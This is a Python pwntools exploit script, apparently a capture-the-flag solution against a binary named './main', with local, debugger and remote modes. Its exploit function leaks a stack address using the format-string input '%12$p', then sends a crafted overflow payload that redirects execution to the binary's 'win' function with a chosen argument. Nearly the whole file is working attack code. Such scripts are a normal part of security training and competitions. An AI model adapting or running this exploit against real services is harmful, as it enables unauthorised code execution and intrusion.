#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *main+273
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendline(b'%12$p')
    io.recvuntil(b'0x')
    stack = int(io.recvline().strip().decode(), 16)
    info('stack: %#x', stack)
    io.sendlineafter(b':', cyclic(30, n=4) + p32(stack) + cyclic(24) + p32(elf.sym['win']) + cyclic(4,n=4) + p32(next(elf.search(b'hwhwhw'))))
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()